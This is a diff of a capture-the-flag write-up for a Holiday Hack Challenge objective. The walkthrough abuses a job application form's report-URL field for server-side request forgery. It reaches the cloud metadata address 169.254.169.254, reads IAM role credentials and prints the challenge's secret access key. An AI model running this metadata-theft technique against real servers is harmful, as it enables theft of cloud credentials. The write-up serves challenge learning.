@@ -1,8 +1,8 @@
 # Objective 10: Now Hiring!
-**Location: https://apply.jackfrosttower.com/**
+**Location: https://apply.jackfrosttower.com/**  
 **Hints provided by Noxious O. D'or after completion of [IMDS Exploration](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/IMDS%20Exploration.md)**
 
-This objective is about SSRF.
+This objective is about SSRF to IMDS URLs.
 
 The website's application form consumes the user's name, resume (as file upload) and the URL to the public NLBI report.
 
@@ -16,7 +16,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials
 ```
 Result:
 ```
-jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
+joergen@northpole:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
 jf-deploy-role
 ```
 
@@ -26,7 +26,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
 ```
 
 ```
-jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
+joergen@northpole:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
 ```
 ```json
 {
@@ -40,6 +40,5 @@ jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
 }
 ```
 So the secret access key for the S3 bucket is **CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX**
-
 
 **Achievement: SSRF to IMDS to S3 Bucket Access**
